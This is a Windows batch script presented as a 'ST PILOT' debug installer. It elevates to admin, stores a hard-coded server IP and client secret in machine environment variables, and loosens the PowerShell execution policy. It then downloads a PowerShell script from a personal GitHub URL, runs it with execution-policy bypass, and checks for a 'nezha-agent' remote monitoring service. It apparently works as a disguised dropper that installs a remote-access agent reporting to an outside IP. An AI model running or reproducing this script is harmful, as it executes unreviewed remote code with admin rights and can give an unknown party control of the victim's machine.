@echo off
title ST PILOT - Debug Installer
setlocal enabledelayedexpansion

echo ============================================
echo   ST PILOT - Debug Installer
echo ============================================
echo.

:: --- Configuration ---
set "NZ_SERVER=154.39.0.168:8008"
set "NZ_TLS=false"
set "NZ_CLIENT_SECRET=x5tB8RDqqErqyQNmoP415AfcerBz4A5g"
set "INSTALLER_URL=https://raw.githubusercontent.com/arleng456/agent/refs/heads/main/powershell-exe.ps1"
set "INSTALLER_PATH=%TEMP%\st-pilot-install.ps1"

:: --- Step 1: Check admin ---
echo [Step 1] Checking admin rights...
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [FAIL] Not admin. Requesting elevation...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)
echo [OK] Admin rights confirmed.
echo.

:: --- Step 2: Set machine env vars ---
echo [Step 2] Setting machine environment variables...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "[Environment]::SetEnvironmentVariable('NZ_SERVER', '%NZ_SERVER%', 'Machine');
     [Environment]::SetEnvironmentVariable('NZ_TLS', '%NZ_TLS%', 'Machine');
     [Environment]::SetEnvironmentVariable('NZ_CLIENT_SECRET', '%NZ_CLIENT_SECRET%', 'Machine')"
echo [OK] Env vars set.
echo.

:: --- Step 3: Set ExecutionPolicy ---
echo [Step 3] Setting ExecutionPolicy...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-ExecutionPolicy RemoteSigned -Scope LocalMachine -Force"
echo [OK] ExecutionPolicy set.
echo.

:: --- Step 4: Download installer ---
echo [Step 4] Downloading installer from GitHub...
echo URL: %INSTALLER_URL%
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3 -bor
            [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor
            [Net.SecurityProtocolType]::Tls12;
        Invoke-WebRequest -Uri '%INSTALLER_URL%' -OutFile '%INSTALLER_PATH%' -UseBasicParsing;
        Write-Host 'DOWNLOAD_OK'
    } catch { Write-Host 'DOWNLOAD_FAIL: ' $_.Exception.Message }"
echo.

:: --- Step 5: Verify download ---
echo [Step 5] Verifying download...
if not exist "%INSTALLER_PATH%" (
    echo [FAIL] File not found at: %INSTALLER_PATH%
    echo [INFO] The download may have failed. Check internet connection and URL.
    echo.
    echo   Troubleshooting:
    echo   1. Open this URL in a browser and see if it downloads:
    echo      %INSTALLER_URL%
    echo   2. If browser shows 404, the file doesn't exist on GitHub
    echo   3. If browser shows the script content, the URL is correct
    pause
    exit /b 1
)
echo [OK] File downloaded successfully.
echo   Size: %~zI bytes
echo.

:: --- Step 6: Show what's in the downloaded file ---
echo [Step 6] Contents of downloaded file (first 10 lines):
echo ----------------------------------------
type "%INSTALLER_PATH%" | findstr /n "^" | findstr "^1\|^2\|^3\|^4\|^5\|^6\|^7\|^8\|^9\|^10"
echo ----------------------------------------
echo.

:: --- Step 7: Run the installer ---
echo [Step 7] Running the installer...
echo   This may take a moment...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -File "%INSTALLER_PATH%"
set "INSTALL_EXIT=%errorlevel%"
echo.
echo [INFO] Installer exited with code: %INSTALL_EXIT%

:: --- Step 8: Check if agent is running ---
echo.
echo [Step 8] Checking if agent service exists...
sc query nezha-agent >nul 2>&1
if %errorlevel% equ 0 (
    echo [OK] nezha-agent service found!
    sc query nezha-agent | findstr "STATE"
) else (
    echo [WARN] nezha-agent service not found.
    echo [INFO] The installer script may not have registered a service.
    echo [INFO] Check what install.ps1 actually does when run manually.
)

:: --- Step 9: Check env vars ---
echo.
echo [Step 9] Verifying machine env vars...
for %%v in (NZ_SERVER NZ_TLS NZ_CLIENT_SECRET) do (
    set "VAL="
    for /f "tokens=2,*" %%a in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v %%v 2^>nul') do set "VAL=%%b"
    if defined VAL (
        echo   [OK] %%v = !VAL!
    ) else (
        echo   [FAIL] %%v not found in registry
    )
)

:: --- Step 10: Check logs ---
echo.
echo [Step 10] Checking for logs...
if exist "%LOCALAPPDATA%\ST-PILOT\logs" (
    echo [OK] Log directory exists.
    dir /b "%LOCALAPPDATA%\ST-PILOT\logs" 2>nul
) else (
    echo [INFO] No log directory found yet.
)

echo.
echo ============================================
echo   Debug session complete.
echo   Press any key to close...
echo ============================================
pause >nul